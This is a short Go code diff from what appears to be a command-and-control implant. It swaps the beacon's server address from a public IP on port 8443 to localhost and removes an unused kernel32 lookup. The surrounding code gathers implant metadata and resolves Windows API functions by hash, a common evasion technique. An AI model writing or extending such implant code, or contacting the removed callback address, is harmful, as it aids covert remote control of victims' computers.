@@ -16,7 +16,7 @@ import (
 )
 
 var (
-	ServerURL	= "http://45.32.6.69:8443/"
+	ServerURL	= "http://127.0.0.1:8443/"
 	Sleep		= uint32(5)
 	Jitter		= uint8(10)
 )
@@ -110,8 +110,6 @@ func gatherMeta(implantID string) *proto.ImplantMeta {
 }
 
 func getUsername() string {
-
-	k32 := wc.GetModuleBase(wc.GetHash("kernel32.dll"))
 	advapi32 := wc.LoadLibraryLdr("advapi32.dll")
 	getUserNameW := wc.GetFunctionAddress(advapi32, wc.GetHash("GetUserNameW"))
 
@@ -122,7 +120,6 @@ func getUsername() string {
 	if ret != 0 {
 		return wc.UTF16ToString(&buf[0])
 	}
-	_ = k32
 	return os.Getenv("USERNAME")
 }
 
